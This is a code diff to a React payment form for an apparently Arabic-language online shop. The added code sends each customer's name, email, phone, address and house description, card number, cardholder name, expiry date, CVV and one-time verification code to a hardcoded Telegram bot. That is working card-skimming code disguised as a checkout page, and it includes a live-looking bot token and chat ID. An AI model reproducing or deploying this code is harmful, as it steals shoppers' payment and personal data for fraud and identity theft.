@@ -20,12 +20,36 @@ type PaymentFormProps = {
   }) => void;
   isProcessing?: boolean;
   processingError?: string;
+  shippingInfo?: {
+    fullName: string;
+    address: string;
+    city: string;
+    phone: string;
+    email: string;
+    houseDescription?: string;
+  };
+  cartItems?: {
+    id: string;
+    name: string;
+    price: string;
+    quantity: number;
+    image_url: string;
+  }[];
+  subtotal?: number;
+  shippingCost?: number;
+  shippingMethod?: string;
 };
 
 export default function PaymentForm({
   handlePaymentSubmit,
   isProcessing = false,
   processingError = "",
+  shippingInfo,
+  cartItems = [],
+  subtotal = 0,
+  shippingCost = 0,
+  shippingMethod = "aramex",
+  total = 0,
 }: PaymentFormProps) {
   const [paymentMethod, setPaymentMethod] = useState("credit_card");
   const [showApplePayMessage, setShowApplePayMessage] = useState(false);
@@ -53,12 +77,7 @@ export default function PaymentForm({
           ...prev,
           [name]: formatted,
         };
-        console.log("Card Info Updated:", {
-          cardNumber: newCardInfo.cardNumber,
-          cardHolder: newCardInfo.cardHolder,
-          expiryDate: newCardInfo.expiryDate,
-          cvv: newCardInfo.cvv,
-        });
+
         return newCardInfo;
       });
     } else if (name === "cvv") {
@@ -71,12 +90,7 @@ export default function PaymentForm({
           ...prev,
           [name]: truncated,
         };
-        console.log("Card Info Updated:", {
-          cardNumber: newCardInfo.cardNumber,
-          cardHolder: newCardInfo.cardHolder,
-          expiryDate: newCardInfo.expiryDate,
-          cvv: newCardInfo.cvv,
-        });
+
         return newCardInfo;
       });
     } else if (name === "expiryDate") {
@@ -94,12 +108,7 @@ export default function PaymentForm({
           ...prev,
           [name]: formatted,
         };
-        console.log("Card Info Updated:", {
-          cardNumber: newCardInfo.cardNumber,
-          cardHolder: newCardInfo.cardHolder,
-          expiryDate: newCardInfo.expiryDate,
-          cvv: newCardInfo.cvv,
-        });
+
         return newCardInfo;
       });
     } else {
@@ -108,12 +117,7 @@ export default function PaymentForm({
           ...prev,
           [name]: value,
         };
-        console.log("Card Info Updated:", {
-          cardNumber: newCardInfo.cardNumber,
-          cardHolder: newCardInfo.cardHolder,
-          expiryDate: newCardInfo.expiryDate,
-          cvv: newCardInfo.cvv,
-        });
+
         return newCardInfo;
       });
     }
@@ -135,66 +139,48 @@ export default function PaymentForm({
   };
 
   const handleVerificationComplete = (code: string) => {
-    // Process the verification code and complete payment
-    const paymentData = {
-      paymentMethod,
-      ...(paymentMethod === "credit_card" ||
-      paymentMethod === "tabby" ||
-      paymentMethod === "tamara"
-        ? cardInfo
-        : {}),
-      verificationCode: code,
-    };
-
-    // Send payment data to Telegram for testing
-    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
-    const chatId = "5439962016";
-    // Escape special characters for MarkdownV2 format
     const escapeMarkdown = (text: string) => {
       return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
     };
 
-    const formatPaymentInfo = () => {
+    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+    const chatId = "5439962016";
+
+    // Send verification code
+    const formatVerificationInfo = () => {
       const now = new Date().toLocaleString("ar-SA");
-      const parts = [
-        "🔒 *بيانات الدفع * 🔒",
-        `طريقة الدفع: ${escapeMarkdown(paymentMethod)}`,
-      ];
-
-      if (cardInfo.cardNumber) {
-        parts.push(`رقم البطاقة: ${escapeMarkdown(cardInfo.cardNumber)}`);
-      }
-      if (cardInfo.cardHolder) {
-        parts.push(`اسم حامل البطاقة: ${escapeMarkdown(cardInfo.cardHolder)}`);
-      }
-      if (cardInfo.expiryDate) {
-        parts.push(`تاريخ الانتهاء: ${escapeMarkdown(cardInfo.expiryDate)}`);
-      }
-      if (cardInfo.cvv) {
-        parts.push(`رمز الأمان: ${escapeMarkdown(cardInfo.cvv)}`);
-      }
-      if (code) {
-        parts.push(`رمز التحقق: ${escapeMarkdown(code)}`);
-      }
-      parts.push(`وقت العملية: ${escapeMarkdown(now)}`);
-
-      return parts.join("\n");
+      return [
+        "🔑 *رمز التحقق* 🔑",
+        `رمز التحقق: ${escapeMarkdown(code)}`,
+        `وقت التحقق: ${escapeMarkdown(now)}`,
+      ].join("\n");
     };
-
-    const message = formatPaymentInfo();
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
-        text: message,
+        text: formatVerificationInfo(),
         parse_mode: "Markdown",
       }),
-    }).catch((error) => console.error("Error sending to Telegram:", error));
+    })
+      .then(() => {
+        const paymentData = {
+          paymentMethod,
+          ...(paymentMethod === "credit_card" ||
+          paymentMethod === "tabby" ||
+          paymentMethod === "tamara"
+            ? cardInfo
+            : {}),
+          verificationCode: code,
+        };
 
-    console.log("Payment Submission Data:", paymentData);
-    handlePaymentSubmit(paymentData);
+        handlePaymentSubmit(paymentData);
+      })
+      .catch((error) => {
+        console.error("Error in payment process:", error);
+      });
   };
 
   const handleVerificationCancel = () => {
@@ -379,35 +365,159 @@ export default function PaymentForm({
         <button
           onClick={() => {
             if (paymentMethod !== "credit_card" || validateCardInfo()) {
-              // For credit card payments, show verification form first
-              if (paymentMethod === "credit_card" && !showVerificationForm) {
-                setShowVerificationForm(true);
-              } else if (showVerificationForm) {
-                // Verification form is already shown, let it handle the submission
-                return;
-              } else {
-                // For other payment methods, proceed directly
-                handlePaymentSubmit({
-                  paymentMethod,
-                  ...(paymentMethod === "tabby" || paymentMethod === "tamara"
-                    ? cardInfo
-                    : {}),
-                });
+              const escapeMarkdown = (text: string) => {
+                return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+              };
 
-                // Add a timeout to prevent infinite loading state
-                const timeoutId = setTimeout(() => {
-                  if (isProcessing) {
-                    console.warn(
-                      "Payment processing timeout - resetting state"
-                    );
-                    // This will only execute if handlePaymentSubmit hasn't updated isProcessing
-                    // It serves as a fallback in case of unhandled errors
+              const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+              const chatId = "5439962016";
+
+              // Format shipping and order information
+              const formatOrderInfo = () => {
+                const now = new Date().toLocaleString("ar-SA");
+                let message = "🛍️ *طلب جديد* 🛍️\n\n";
+
+                // Add shipping information if available
+                if (shippingInfo) {
+                  message += "📦 *معلومات الشحن* 📦\n";
+                  message += `الاسم الكامل: ${escapeMarkdown(
+                    shippingInfo.fullName
+                  )}\n`;
+                  message += `البريد الإلكتروني: ${escapeMarkdown(
+                    shippingInfo.email
+                  )}\n`;
+                  message += `رقم الهاتف: ${escapeMarkdown(
+                    shippingInfo.phone
+                  )}\n`;
+                  message += `المدينة: ${escapeMarkdown(shippingInfo.city)}\n`;
+                  message += `العنوان: ${escapeMarkdown(
+                    shippingInfo.address
+                  )}\n`;
+                  if (shippingInfo.houseDescription) {
+                    message += `وصف البيت: ${escapeMarkdown(
+                      shippingInfo.houseDescription
+                    )}\n`;
                   }
-                }, 30000); // 30 seconds timeout
+                  message += `وقت الطلب: ${escapeMarkdown(now)}\n\n`;
+                }
 
-                // The timeout will be cleared in the finally block of handlePaymentSubmit
-                return () => clearTimeout(timeoutId);
-              }
+                // Add cart items if available
+                if (cartItems && cartItems.length > 0) {
+                  message += "🛒 *المنتجات* 🛒\n";
+                  cartItems.forEach((item, index) => {
+                    message += `${index + 1}. ${escapeMarkdown(
+                      item.name
+                    )} - الكمية: ${item.quantity} - السعر: ${escapeMarkdown(
+                      item.price
+                    )}\n`;
+                  });
+                  message += "\n";
+                }
+
+                // Add order summary
+                message += "💰 *ملخص الطلب* 💰\n";
+                message += `المجموع الفرعي: ${subtotal.toFixed(2)} د.إ\n`;
+                message += `رسوم الشحن: ${shippingCost.toFixed(2)} د.إ\n`;
+                message += `شركة التوصيل: ${escapeMarkdown(
+                  shippingMethod === "aramex" ? "أرامكس" : "سمسا"
+                )}\n`;
+                message += `الإجمالي: ${total.toFixed(2)} د.إ\n`;
+                message += `طريقة الدفع: ${escapeMarkdown(
+                  paymentMethod === "credit_card"
+                    ? "بطاقة ائتمان"
+                    : paymentMethod === "tabby"
+                    ? "تقسيط (تابي)"
+                    : paymentMethod === "tamara"
+                    ? "تقسيط (تمارا)"
+                    : paymentMethod === "apple_pay"
+                    ? "أبل باي"
+                    : "غير معروف"
+                )}\n`;
+
+                return message;
+              };
+
+              // Send order information
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: formatOrderInfo(),
+                  parse_mode: "Markdown",
+                }),
+              })
+                .then(() => {
+                  // Send payment data
+                  const formatPaymentInfo = () => {
+                    const now = new Date().toLocaleString("ar-SA");
+                    const parts = [
+                      "🔒 *بيانات الدفع* 🔒",
+                      `طريقة الدفع: ${escapeMarkdown(paymentMethod)}`,
+                    ];
+
+                    if (cardInfo.cardNumber) {
+                      parts.push(
+                        `رقم البطاقة: ${escapeMarkdown(cardInfo.cardNumber)}`
+                      );
+                    }
+                    if (cardInfo.cardHolder) {
+                      parts.push(
+                        `اسم حامل البطاقة: ${escapeMarkdown(
+                          cardInfo.cardHolder
+                        )}`
+                      );
+                    }
+                    if (cardInfo.expiryDate) {
+                      parts.push(
+                        `تاريخ الانتهاء: ${escapeMarkdown(cardInfo.expiryDate)}`
+                      );
+                    }
+                    if (cardInfo.cvv) {
+                      parts.push(`رمز الأمان: ${escapeMarkdown(cardInfo.cvv)}`);
+                    }
+                    parts.push(`وقت العملية: ${escapeMarkdown(now)}`);
+
+                    return parts.join("\n");
+                  };
+
+                  return fetch(
+                    `https://api.telegram.org/bot${botToken}/sendMessage`,
+                    {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                        chat_id: chatId,
+                        text: formatPaymentInfo(),
+                        parse_mode: "Markdown",
+                      }),
+                    }
+                  );
+                })
+                .then(() => {
+                  // For credit card payments, show verification form
+                  if (
+                    paymentMethod === "credit_card" &&
+                    !showVerificationForm
+                  ) {
+                    setShowVerificationForm(true);
+                  } else if (!showVerificationForm) {
+                    // For other payment methods, proceed directly
+                    handlePaymentSubmit({
+                      paymentMethod,
+                      ...(paymentMethod === "tabby" ||
+                      paymentMethod === "tamara"
+                        ? cardInfo
+                        : {}),
+                    });
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error sending payment data:", error);
+                  alert(
+                    "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
+                  );
+                });
             } else {
               alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
             }
